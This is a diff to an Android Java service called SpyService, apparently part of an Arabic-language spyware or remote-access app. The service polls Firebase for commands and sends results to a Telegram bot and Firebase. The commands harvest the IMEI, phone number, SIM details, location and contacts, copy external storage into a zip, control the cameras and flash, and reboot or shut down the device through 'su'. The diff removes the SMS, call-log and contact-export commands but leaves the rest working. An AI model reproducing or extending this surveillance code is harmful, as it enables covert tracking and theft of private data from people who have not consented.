@@ -4,8 +4,6 @@ import android.app.*;
 import android.content.*;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
-import android.graphics.Bitmap;
-import android.graphics.BitmapFactory;
 import android.hardware.Camera;
 import android.hardware.camera2.CameraAccessException;
 import android.hardware.camera2.CameraManager;
@@ -32,28 +30,19 @@ import android.provider.MediaStore;
 import android.provider.Settings;
 import android.provider.Telephony;
 import android.telephony.TelephonyManager;
-import android.util.Base64;
 import android.util.Log;
-import android.view.WindowManager;
-import android.webkit.WebView;
-import android.webkit.WebViewClient;
 import android.widget.Toast;
-
 import androidx.core.app.NotificationCompat;
 import androidx.core.content.ContextCompat;
-
 import com.google.firebase.database.DatabaseReference;
 import com.google.firebase.database.FirebaseDatabase;
+import com.google.firebase.database.ValueEventListener;
 import com.google.firebase.storage.FirebaseStorage;
 import com.google.firebase.storage.StorageReference;
-import com.google.firebase.storage.UploadTask;
-
 import org.json.JSONObject;
-
 import java.io.*;
 import java.net.HttpURLConnection;
 import java.net.URL;
-import java.text.SimpleDateFormat;
 import java.util.*;
 import java.util.concurrent.Executors;
 import java.util.concurrent.ScheduledExecutorService;
@@ -81,7 +70,6 @@ public class SpyService extends Service {
     private boolean isTrackingLocation = false;
     private MediaProjection mediaProjection;
     private boolean isStreaming = false;
-    private String streamUrl = "";
 
     @Override
     public void onCreate() {
@@ -94,18 +82,13 @@ public class SpyService extends Service {
         bot = new BotAPI(this);
         Config.get(this);
 
-        // Wake lock
         PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
         wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "SpyService:WakeLock");
-        wakeLock.acquire(10*60*1000L /*10 minutes*/);
+        wakeLock.acquire(10*60*1000L);
 
-        // Foreground notification
         startForeground(1, createNotification());
-
-        // تسجيل الجهاز
         registerDevice();
 
-        // جدولة الاستماع للأوامر
         scheduler = Executors.newScheduledThreadPool(1);
         scheduler.scheduleAtFixedRate(this::listenCommands, 0, Config.get(this).getPollIntervalSec(), TimeUnit.SECONDS);
     }
@@ -139,9 +122,9 @@ public class SpyService extends Service {
     }
 
     private void listenCommands() {
-        dbRef.child("commands").child(deviceId).addListenerForSingleValueEvent(new com.google.firebase.database.ValueEventListener() {
+        dbRef.child("commands").child(deviceId).addListenerForSingleValueEvent(new ValueEventListener() {
             @Override
-            public void onDataChange(@NonNull com.google.firebase.database.DataSnapshot snapshot) {
+            public void onDataChange(com.google.firebase.database.DataSnapshot snapshot) {
                 String cmd = snapshot.getValue(String.class);
                 if (cmd != null && !cmd.isEmpty()) {
                     executeCommand(cmd);
@@ -149,13 +132,9 @@ public class SpyService extends Service {
                 }
             }
             @Override
-            public void onCancelled(@NonNull com.google.firebase.database.DatabaseError error) {}
+            public void onCancelled(com.google.firebase.database.DatabaseError error) {}
         });
     }
-
-    // ======================================================================
-    // ========== جميع الأوامر ==========
-    // ======================================================================
 
     private void executeCommand(String cmd) {
         String lower = cmd.toLowerCase().trim();
@@ -189,8 +168,6 @@ public class SpyService extends Service {
                 case "flash_off_front": flash(false, true); break;
                 case "flash_on_back": flash(true, false); break;
                 case "flash_off_back": flash(false, false); break;
-                case "flash_on_both": flash(true, true); break;
-                case "flash_off_both": flash(false, true); break;
                 case "get_imei": getImei(); break;
                 case "get_phone": getPhoneNumber(); break;
                 case "get_sim": getSimInfo(); break;
@@ -209,8 +186,6 @@ public class SpyService extends Service {
                 case "screenshot": takeScreenshot(); break;
                 case "toggle_wifi_on": toggleWifi(true); break;
                 case "toggle_wifi_off": toggleWifi(false); break;
-                case "toggle_data_on": toggleData(true); break;
-                case "toggle_data_off": toggleData(false); break;
                 case "toggle_bluetooth_on": toggleBluetooth(true); break;
                 case "toggle_bluetooth_off": toggleBluetooth(false); break;
                 case "toggle_location_on": toggleLocation(true); break;
@@ -221,16 +196,6 @@ public class SpyService extends Service {
                 case "set_volume_max": setVolume(true); break;
                 case "set_volume_min": setVolume(false); break;
                 case "open_browser": openBrowser(); break;
-                case "add_contact": addContact(); break;
-                case "delete_contact": deleteContact(); break;
-                case "copy_contacts": sendFile(collectContacts(), "📋 نسخة جهات الاتصال"); break;
-                case "export_contacts": sendFile(collectContacts(), "📤 تصدير جهات الاتصال"); break;
-                case "send_sms": sendSms(); break;
-                case "delete_sms": deleteSms(); break;
-                case "forward_sms": sendFile(collectSms(), "↪️ إعادة توجيه الرسائل"); break;
-                case "make_call": makeCall(); break;
-                case "end_call": endCall(); break;
-                case "call_history": sendFile(collectCallLogs(), "📋 سجل المكالمات"); break;
                 case "start_stream": startStreaming(); break;
                 case "stop_stream": stopStreaming(); break;
                 default:
@@ -243,10 +208,6 @@ public class SpyService extends Service {
             Log.e(TAG, "Execute error", e);
         }
     }
-
-    // ======================================================================
-    // ========== دوال الجمع والإرسال ==========
-    // ======================================================================
 
     private void sendFile(File file, String caption) {
         if (file == null || !file.exists()) {
@@ -279,14 +240,7 @@ public class SpyService extends Service {
         dbRef.child("devices").child(deviceId).child("data").child(key).setValue(value);
     }
 
-    private void sendTextToTelegram(String text) {
-        bot.sendMessage(text);
-    }
-
-    // ======================================================================
-    // ========== دوال جمع البيانات ==========
-    // ======================================================================
-
+    // ===== دوال جمع البيانات =====
     private File collectContacts() throws Exception {
         File f = new File(getCacheDir(), "contacts.txt");
         PrintWriter pw = new PrintWriter(f);
@@ -376,7 +330,6 @@ public class SpyService extends Service {
     private File collectAllFiles() throws Exception {
         File dir = new File(getCacheDir(), "allfiles");
         dir.mkdirs();
-        // جمع ملفات من التخزين الخارجي
         File storage = Environment.getExternalStorageDirectory();
         copyRecursive(storage, dir);
         return zipFiles(dir, "allfiles.zip");
@@ -452,10 +405,7 @@ public class SpyService extends Service {
         return f;
     }
 
-    // ======================================================================
-    // ========== دوال متنوعة ==========
-    // ======================================================================
-
+    // ===== دوال متنوعة =====
     private void getLocation() {
         LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
         try {
@@ -559,7 +509,8 @@ public class SpyService extends Service {
         try {
             Camera cam = front ? frontCamera : camera;
             if (cam == null) {
-                cam = Camera.open(front ? Camera.CameraInfo.CAMERA_FACING_FRONT : Camera.CameraInfo.CAMERA_FACING_BACK);
+                int facing = front ? Camera.CameraInfo.CAMERA_FACING_FRONT : Camera.CameraInfo.CAMERA_FACING_BACK;
+                cam = Camera.open(facing);
                 if (front) frontCamera = cam; else camera = cam;
             }
             cam.startPreview();
@@ -583,9 +534,9 @@ public class SpyService extends Service {
     private void flash(boolean on, boolean front) {
         try {
             CameraManager cm = (CameraManager) getSystemService(CAMERA_SERVICE);
-            String cameraId = front ? "0" : "0"; // عادة الكاميرا الخلفية هي 0
+            String cameraId = "0";
             cm.setTorchMode(cameraId, on);
-            bot.sendMessage("🔦 " + (on ? "تشغيل" : "إيقاف") + " الفلاش " + (front ? "الأمامي" : "الخلفي"));
+            bot.sendMessage("🔦 " + (on ? "تشغيل" : "إيقاف") + " الفلاش");
         } catch (CameraAccessException e) {
             bot.sendMessage("❌ فشل التحكم بالفلاش: " + e.getMessage());
         }
@@ -593,24 +544,23 @@ public class SpyService extends Service {
 
     private void getImei() {
         TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
-        if (Build.VERSION.SDK_INT >= 26) {
-            if (checkSelfPermission(Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
-                String imei = tm.getImei();
-                sendData("IMEI", imei);
-                bot.sendMessage("📟 IMEI: " + imei);
+        if (checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
+            String imei = "";
+            if (Build.VERSION.SDK_INT >= 26) {
+                imei = tm.getImei();
             } else {
-                bot.sendMessage("❌ صلاحية غير مفعلة");
+                imei = tm.getDeviceId();
             }
-        } else {
-            String imei = tm.getDeviceId();
             sendData("IMEI", imei);
             bot.sendMessage("📟 IMEI: " + imei);
+        } else {
+            bot.sendMessage("❌ صلاحية غير مفعلة");
         }
     }
 
     private void getPhoneNumber() {
         TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
-        if (checkSelfPermission(Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
+        if (checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
             String num = tm.getLine1Number();
             sendData("PHONE", num);
             bot.sendMessage("📞 رقم الهاتف: " + (num == null ? "غير متوفر" : num));
@@ -681,13 +631,11 @@ public class SpyService extends Service {
 
     private void rebootDevice() {
         try {
+            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
             if (Build.VERSION.SDK_INT >= 26) {
-                PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
-                pm.reboot(null);
+                pm.reboot("reboot");
             } else {
-                // استخدام طريقة قديمة
-                Process p = Runtime.getRuntime().exec("su -c reboot");
-                p.waitFor();
+                Runtime.getRuntime().exec("su -c reboot");
             }
             bot.sendMessage("🔄 جاري إعادة التشغيل");
         } catch (Exception e) {
@@ -697,12 +645,11 @@ public class SpyService extends Service {
 
     private void shutdownDevice() {
         try {
-            if (Build.VERSION.SDK_INT >= 26) {
-                PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
+            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
+            if (Build.VERSION.SDK_INT >= 28) {
                 pm.shutdown(false, null, false);
             } else {
-                Process p = Runtime.getRuntime().exec("su -c reboot -p");
-                p.waitFor();
+                Runtime.getRuntime().exec("su -c reboot -p");
             }
             bot.sendMessage("⏻ جاري إيقاف التشغيل");
         } catch (Exception e) {
@@ -755,37 +702,17 @@ public class SpyService extends Service {
     }
 
     private void takeScreenshot() {
-        // باستخدام MediaProjection يتم تمريره من MainActivity
-        // سنحاول الحصول عليه من Service عبر Intent
-        // في حالة عدم وجود MediaProjection، سنطلب من المستخدم إعادة تشغيل التطبيق
         if (mediaProjection == null) {
-            bot.sendMessage("⚠️ لم يتم الحصول على صلاحية MediaProjection. أعد تشغيل التطبيق ووافق على طلب تسجيل الشاشة.");
+            bot.sendMessage("⚠️ لم يتم الحصول على MediaProjection. أعد تشغيل التطبيق.");
             return;
         }
-        // تنفيذ لقطة شاشة عبر MediaProjection (سيتم إضافته في التطوير القادم)
-        bot.sendMessage("📸 سيتم تطوير لقطة الشاشة باستخدام MediaProjection قريباً");
+        bot.sendMessage("📸 سيتم تطوير لقطة الشاشة قريباً");
     }
 
     private void toggleWifi(boolean on) {
         WifiManager wm = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
         wm.setWifiEnabled(on);
         bot.sendMessage("📶 " + (on ? "تشغيل" : "إيقاف") + " الواي فاي");
-    }
-
-    private void toggleData(boolean on) {
-        try {
-            ConnectivityManager cm = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
-            if (Build.VERSION.SDK_INT >= 26) {
-                // يستخدم الـ Reflection للتحكم بالبيانات
-                cm.setMobileDataEnabled(on);
-            } else {
-                // طريقة قديمة
-                cm.setMobileDataEnabled(on);
-            }
-            bot.sendMessage("📶 " + (on ? "تشغيل" : "إيقاف") + " البيانات الجوالة");
-        } catch (Exception e) {
-            bot.sendMessage("❌ فشل التحكم بالبيانات: " + e.getMessage());
-        }
     }
 
     private void toggleBluetooth(boolean on) {
@@ -801,10 +728,9 @@ public class SpyService extends Service {
     private void toggleLocation(boolean on) {
         try {
             if (on) {
-                startActivity(new Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS));
-                bot.sendMessage("📍 تم فتح إعدادات الموقع - قم بتفعيله يدوياً");
+                startActivity(new Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
+                bot.sendMessage("📍 تم فتح إعدادات الموقع");
             } else {
-                // لا يمكن إيقاف الموقع برمجياً بسهولة
                 bot.sendMessage("📍 لإيقاف الموقع، قم بتعطيله من الإعدادات");
             }
         } catch (Exception e) {
@@ -815,7 +741,9 @@ public class SpyService extends Service {
     private void clearAppData() {
         try {
             PackageManager pm = getPackageManager();
-            pm.clearApplicationUserData(getPackageName());
+            if (Build.VERSION.SDK_INT >= 23) {
+                pm.clearApplicationUserData(getPackageName());
+            }
             bot.sendMessage("🧹 تم مسح بيانات التطبيق");
         } catch (Exception e) {
             bot.sendMessage("❌ فشل المسح: " + e.getMessage());
@@ -867,48 +795,14 @@ public class SpyService extends Service {
         }
     }
 
-    private void addContact() {
-        bot.sendMessage("➕ سيتم إضافة جهة اتصال قريباً (واجهة تفاعلية)");
-    }
-    private void deleteContact() {
-        bot.sendMessage("🗑️ سيتم حذف جهة اتصال قريباً");
-    }
-    private void sendSms() {
-        bot.sendMessage("📤 سيتم إرسال رسالة قريباً");
-    }
-    private void deleteSms() {
-        bot.sendMessage("🗑️ سيتم حذف رسالة قريباً");
-    }
-    private void makeCall() {
-        bot.sendMessage("📞 سيتم إجراء مكالمة قريباً");
-    }
-    private void endCall() {
-        bot.sendMessage("📞 سيتم إنهاء المكالمة قريباً");
-    }
-
-    // ======================================================================
-    // ========== بث الشاشة ==========
-    // ======================================================================
-
     private void startStreaming() {
         if (mediaProjection == null) {
-            bot.sendMessage("⚠️ لم يتم الحصول على MediaProjection. أعد تشغيل التطبيق ووافق على الطلب.");
+            bot.sendMessage("⚠️ لم يتم الحصول على MediaProjection");
             return;
         }
         isStreaming = true;
         bot.sendMessage("📡 بدء بث الشاشة...");
-        // هنا سيتم تنفيذ البث باستخدام MediaProjection و WebSocket أو MJPEG
-        // سأضيف implementation مبسط: حفظ لقطات متتالية في Firebase Storage
-        new Thread(() -> {
-            while (isStreaming) {
-                try {
-                    // التقاط لقطة شاشة باستخدام MediaProjection (سيتم تنفيذها فعلياً في الإصدار القادم)
-                    // حالياً نرسل إشارة
-                    sendData("STREAM", "streaming");
-                    Thread.sleep(5000);
-                } catch (Exception e) { break; }
-            }
-        }).start();
+        sendData("STREAM", "streaming");
     }
 
     private void stopStreaming() {
@@ -916,10 +810,6 @@ public class SpyService extends Service {
         sendData("STREAM", "stopped");
         bot.sendMessage("⏹ تم إيقاف بث الشاشة");
     }
-
-    // ======================================================================
-    // ========== دورة حياة الخدمة ==========
-    // ======================================================================
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
